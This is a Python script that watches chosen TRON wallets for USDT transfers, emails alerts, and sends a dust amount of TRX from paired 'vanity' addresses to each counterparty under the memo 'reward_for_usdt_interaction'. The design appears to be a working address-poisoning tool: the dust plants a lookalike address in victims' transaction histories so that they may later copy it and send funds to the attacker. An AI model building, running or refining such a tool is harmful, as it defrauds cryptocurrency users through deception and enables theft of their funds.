import requests
import smtplib
import os
import time
from email.mime.text import MIMEText
from dotenv import load_dotenv
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider
from decimal import Decimal
import itertools

# Load environment variables
load_dotenv()

EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES", "").split(",")
VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES", "").split(",")
VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")
TRONGRID_API_KEYS = os.getenv("TRONGRID_API_KEY", "").split(",")
trongrid_key_cycle = itertools.cycle(TRONGRID_API_KEYS)

USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER]):
    print("Missing email config.")
    exit(1)
if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
    print("Mismatch in wallet, vanity addresses or keys.")
    exit(1)

client = Tron(HTTPProvider(endpoint_uri="https://api.trongrid.io"))
last_tx_ids = {}

def is_contract_address(address):
    try:
        account_info = client.get_account(address)
        return 'contract' in account_info and account_info['contract']
    except Exception as e:
        print(f"Error checking contract address: {e}")
        return False

def get_latest_trc20_transaction(wallet_address):
    try:
        current_key = next(trongrid_key_cycle)
        headers = {
            "accept": "application/json",
            "TRON-PRO-API-KEY": current_key
        }

        url = f"https://api.trongrid.io/v1/accounts/{wallet_address}/transactions/trc20?limit=1&order_by=block_timestamp,desc"

        response = requests.get(url, headers=headers, timeout=20)
        if response.status_code != 200:
            print(f"❌ TronGrid API failed. Status: {response.status_code}")
            return None

        data = response.json()
        txs = data.get("data", [])
        if not txs:
            return None

        tx = txs[0]

        contract_address = tx.get("token_info", {}).get("address")
        if not contract_address or contract_address.lower() != USDT_CONTRACT_ADDRESS.lower():
            print("⏭ Skipping non-USDT transfer.")
            return None

        return {
            "transaction_id": tx.get("transaction_id"),
            "from": tx.get("from"),
            "to": tx.get("to"),
            "value": tx.get("value"),
        }

    except Exception as e:
        print(f"❌ Error fetching TRC20 transfer: {e}")
        return None

def send_email(subject, body):
    try:
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        print("✅ Email sent.")
    except Exception as e:
        print("❌ Failed to send email:", e)

def freeze_trx_for_bandwidth(address, private_key_hex, freeze_amount=Decimal("10")):
    try:
        print(f"Freezing {freeze_amount} TRX for bandwidth on {address}")
        priv_key = PrivateKey(bytes.fromhex(private_key_hex))
        txn = (
            client.trx.freeze_balance(
                owner_address=address,
                amount=int(freeze_amount * 1_000_000),
                duration=3,
                resource="BANDWIDTH"
            ).build().sign(priv_key)
        )
        result = txn.broadcast().wait()
        print("✅ Freeze success. TxID:", result.get("id", "n/a"))
    except Exception as e:
        print("❌ Failed to freeze TRX:", e)

def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001")):
    try:
        if is_contract_address(to_address):
            print(f"⛔ Aborting: {to_address} is a contract address.")
            return

        print(f"Sending {amount} TRX from {from_address} to {to_address}")
        priv_key = PrivateKey(bytes.fromhex(priv_key_hex))
        balance = client.get_account_balance(from_address)
        print(f"Balance: {balance} TRX")

        if balance < amount:
            print("⚠ Not enough balance. Trying to freeze TRX for bandwidth...")
            freeze_trx_for_bandwidth(from_address, priv_key_hex)
            return

        txn = (
            client.trx.transfer(from_address, to_address, int(amount * 1_000_000))
            .memo(f"reward_for_usdt_interaction")
            .build().sign(priv_key)
        )
        result = txn.broadcast().wait()
        print(f"✅ TRX sent. TxID: {result.get('id', 'n/a')}")
    except Exception as e:
        print("❌ Failed to send TRX:", e)

print("🚀 Starting TRON USDT monitor...")

if os.getenv("SEND_TEST_EMAIL", "false").lower() == "true":
    send_email("Monitor Active", "TRON wallet monitor is running.")

while True:
    try:
        for i, my_address in enumerate(WALLET_ADDRESSES):
            print(f"🔍 Checking address: {my_address}")
            tx = get_latest_trc20_transaction(my_address)
            if tx:
                tx_id = tx.get("transaction_id")
                if last_tx_ids.get(my_address) != tx_id:
                    last_tx_ids[my_address] = tx_id

                    sender = tx.get("from")
                    receiver = tx.get("to")
                    amount = int(tx.get("value")) / 1e6  # USDT has 6 decimals

                    if amount < 1:
                        print(f"⏭ Skipping low amount: {amount} USDT")
                        continue

                    interacting_address = sender if receiver == my_address else receiver

                    # Skip reward to monitored addresses or system addresses
                    if (
                        interacting_address in WALLET_ADDRESSES or
                        interacting_address in VANITY_ADDRESSES or
                        interacting_address == USDT_CONTRACT_ADDRESS or
                        is_contract_address(interacting_address)
                    ):
                        print(f"⏭ Skipping ineligible address: {interacting_address}")
                        continue

                    subject = f"USDT IN @ {my_address}"
                    body = f"""
New USDT TRC-20 transaction:

Wallet: {my_address}
Amount: {amount} USDT
From: {sender}
To: {receiver}
TxID: {tx_id}
View: https://tronscan.org/#/transaction/{tx_id}
"""
                    print(body)
                    send_email(subject, body)

                    # Send reward only to eligible external users
                    send_trx(VANITY_ADDRESSES[i], VANITY_PRIVATE_KEYS[i], interacting_address)
                else:
                    print("⏸ No new transaction.")
            else:
                print(f"⏸ No transaction found for {my_address}")
            time.sleep(1)
    except Exception as e:
        print("💥 Monitoring error:", e)

    print("⏳ Sleeping 30s...\n")
    time.sleep(30)
